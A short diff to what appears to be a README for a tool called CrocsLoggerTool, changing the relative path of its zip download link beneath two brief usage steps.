@@ -11,4 +11,4 @@ How to use:
 * Check readme file
 * Use exe file
 
-[CrocsLoggerTool.zip](uploads/391402056655b7a54d7d95776434cc8b/CrocsLoggerTool.zip)
+[CrocsLoggerTool.zip](../uploads/391402056655b7a54d7d95776434cc8b/CrocsLoggerTool.zip)
